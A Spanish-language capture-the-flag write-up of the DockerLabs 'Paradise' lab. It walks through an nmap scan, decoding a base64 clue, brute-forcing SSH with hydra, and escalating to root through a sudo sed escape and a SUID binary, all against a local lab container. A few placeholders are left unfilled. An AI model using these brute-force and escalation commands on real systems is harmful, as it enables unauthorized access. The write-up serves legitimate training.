---
title: Paradise - DockerLabs
published: true
categories: DockerLabs
---


| OS     | Dificultad  | Creator           |
| ------ | ----------- | -------------     | 
| Linux  |  Fácil      | kaikoperez        | 


# Reconocimiento

Comenzamos el proceso de reconocimiento identificando los puertos abiertos en el sistema objetivo. 
```shell
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG ports 
```
-  `-p-`: Escanea todos los puertos (1-65535).
- `--open`: Solo muestra los puertos abiertos.
- `-sS`: Realiza un escaneo SYN, que es rápido y discreto.
- `--min-rate=5000`: Envía al menos 5000 paquetes por segundo, acelerando el escaneo.
- `-n`: No realiza resolución DNS.
- `-Pn`: No realiza ping previo para determinar si el host está activo.
- `-vvv`: Muestra resultados detallados y en tiempo real.

![image](https://github.com/user-attachments/assets/3e8b1d91-4b63-4e39-b87e-d751854957d9)

Durante el escaneo, descubrimos que los siguientes puertos están activos:
- `22` (SSH)
- `80` (HTTP)
- `139` (Pon que servicio es )
- `445` (Pon que servicio es)

A continuación, evaluamos si los puertos abiertos presentan alguna vulnerabilidad, además de obtener más información sobre los servicios asociados a esos puertos.

```bash
nmap -p22,80,139,445 -sCV 172.17.0.2 -oG targeted
```
![image](https://github.com/user-attachments/assets/7795b7c4-9a86-4a4c-a117-dc96d1c390db)

# Exploración Web

Vamos a empezar accediendo al puerto `80`.

Vemos un pagina la cual contiene dos botones en lo que accedemos a otros apartados de la pagina.

![image](https://github.com/user-attachments/assets/620ea296-e2fc-420b-b0ce-7368bbabde81)

En el apartado de `galery` , vemo que hay al final vemos algo encriptado en `base64`.

![image](https://github.com/user-attachments/assets/2c915674-a9c6-4f21-a578-d06b72f0b1f0)

Ahora vamos a descifrar lo que pone.
```bash
echo 'ZXN0b2VzdW5zZWNyZXRvCg==' | base64 -d
```
![image](https://github.com/user-attachments/assets/ea3460a6-fa51-4f4c-a431-d3fbffe394e5)

Podria ser desde una contraseña, hasta un directorio por lo que vamos a probar si es un directorio.

![image](https://github.com/user-attachments/assets/30da2960-344b-468c-8b7d-bd0ee664c48c)

Por lo que se ve es un directorio oculto que contiene un archivo llamado `mensaje_para_lucas.txt`.

![image](https://github.com/user-attachments/assets/04c48046-3617-4554-aafe-f3378d7f3c8a)

El mensaje le comunica a `lucas` que cambie su contraseña porque es `debil` y la podrias sacar a tarves de `fuerza bruta` asi que ya sabemos que hacer.


## Fuerza Bruta
Usaremos `hydra` para sacar la contraseña.

```bash
hydra -l lucas -P /usr/share/wordlists/rockyou.txt -t 64 -VIf ssh://172.17.0.2
```

![image](https://github.com/user-attachments/assets/c34425e5-3b4a-4dd3-befb-08bf7f722484)

Ya tenemos la contraseña de lucas que es `chocolate`.

# Intrucion

Vamos a entrar por ssh , y ver como podemos escalar privilegios.

```bash
ssh lucas@172.17.0.2 
```
![image](https://github.com/user-attachments/assets/22a8a2cc-a204-40a5-add2-fb27034cd2f3)

Lo primero que haremos sera generarnos una shell.

```bash
script /dev/null -c bash
```

# Escalada de privilegios

## Andy

Al ejecutar `sudo -l`, vemos que podemos ejecutar `sed` como `ansy`. Utilizando [GTFOBins](https://gtfobins.github.io/gtfobins/awk/#shell) sabemos cómo explotar estos binarios.

```bash
sudo -u andy sed -n '1e exec sh 1>&0' /etc/hosts
```

Ya somo andy volvemos a generar una shell y volvemos a ver que podemos hacer.

Como no tenemos la contraseña de andy no podemos usar sudo -l, pero podemos probar si hay algun binario que podamos ejecutar ya que tenia un permiso especial:

```bash
find / -perm -4000 2>/dev/null
```

![image](https://github.com/user-attachments/assets/fed510d2-a825-4526-9a1d-a36263f538c9)


Ejecutamos el primero .

```bash
/usr/local/bin/privileged_exec
```

Ya somos root.

![image](https://github.com/user-attachments/assets/10a83925-6af5-4dd1-9d36-e1b84ed27bc6)






